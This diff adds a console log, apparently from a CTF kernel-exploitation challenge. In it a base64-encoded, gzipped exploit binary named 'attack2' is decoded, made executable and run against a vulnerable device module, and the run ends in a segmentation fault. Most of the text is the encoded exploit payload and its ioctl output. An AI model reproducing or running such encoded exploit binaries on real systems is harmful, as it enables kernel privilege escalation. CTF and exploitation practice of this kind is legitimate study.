@@ -1,0 +1,33 @@
+[    4.055234] 9pnet_virtio: no channels available for device hostshare
+mount: mounting hostshare on /home/ctf failed: No such file or directory
+[    4.097995] Module successfuly initialized
+-sh: can't access tty; job control turned off
+~ $ base64 -d | gunzip > attack2
+H4sIAEbSk2EA/+1aPWwcRRQe++5CQIBjiSKIwg6wIgWcfamMsCI3kBOigCZylWG8O+tbZW93md3z
+jxCBREIkcoKQ0iDxJ1HQ0VsuHHc4VIiKhioUQTQ4Be3lvZk39txenIou80l3b9733pt5M7c30ryd
+T99+753JiQlmMcnOM62dWtK6+WasCA5dgFtgDfh+ip3Qvs0jkxNh5H3SrGSnjMC4lqPb8aycnKR8
+SLpxJ7AxS/wsxZGcIXqjFufh4eHh4eHh4eHh4eHh8SSjsxff3O/eaAazcICOb/6GzbPQ7N54NZgH
++e0yMgvQ2sYTdfeOPWjvojrV6n6+N3X9DTiVo9sSuuGBu7u1qJVdPKXvrAOmWp09y3Z3u9TJzhJE
+QidbzWBfD9oMTr4McuuF4A/Ut54NNs6AvHXt7jNmiNNo/gXSBYkA069kOoumW9c2v/9riOq8Vq+2
+nzfWBd2vmYrO1XjPXDLmLvX7Psjvpo0rLgnalmuhH5KO64N6j3Szbs2gAH0bCxVHE74Os9AT/lev
+mrbe0S67L9q1wLIGmBatCdeF1gF/H5Pvm984s6N870O+jx/vny+339K/3jQN1vmv8/tU6+9qOBz6
+/4CHh4eHh4eHh4eHh8eTgLlC5eFcsZ7xSK4loWRzK0k2V/aYVCpXcLJ+DBr4Nt6+tx/hoTZg38uP
+8A2GZ2oX5v7Awdgp9Dn9fTD87Mr+NhxSD+3m/f7BcO/qKL9A/IV790b4d4nHQoOLi7b/2rgJ8V/V
++E+In6/1c5t4rE+4+JF4LE64+Jl4rDu42CEeyxUu7h6T55/H5PmAeDz3uzALMsHWoFbgoqXnM6Fr
+Hi5OE4+1BReB5sd/3w7xtsBgsUi8rXJYXCB+psZf1Pz4c3KJeKyxuIiJx1qMi5x4rNm4+Jh4LJO4
+uEK8rUxZfEG8LahYfI2P/iOe/9uab4zN6wfNj8/3A/LfoHrWIURVifDyubYo+yzM+/2k4qGSUclF
+FClWKFkIJfllqTKZaosxlEqKiCtZDVRmGE2Ifj7IKtMORSbUJs/juJREgT/6jnB9sZqELrsqolVZ
+8SIvuIoSq0KobSbQ/oiUc7xcF8VqydZVUsnamIarDWpISlTvPiwUaQoTi1Xe5/08GqSSpWKQhT1e
+9mSaMrNl8TgBg2ZMUwfzSm5QP7rJZRaxUqxBLqWRJUlVFtSIUwEZx5FZgJVBzAqxmebU5nylLHlZ
+CVUxLiNRCcba5Wa/EisgK2Vkz7b0+G3t1obA/2m/fsm9AzVyb6p2X+qY609nKL5hicP7U+7+eoTR
+u12MvQafk068/Z/OUPxybfx6PI5dc6F+6N4WdYx3wzBXHEvvRySfdnN3/4+vGPlTbX+uqWz6mPjz
+dL/t9Ufk6+IhUiqnNzAnAAA=
+~ $ chmod +x attack2
+~ $ ./attack2
+[   26.235887] Device opened
+[   26.241414] IOCTL Called
+[   26.245169] 320 bytes read from device
+[   26.250138] 240 bytes written to device
+[   26.260444] All device's closed
+Segmentation fault
+~ $
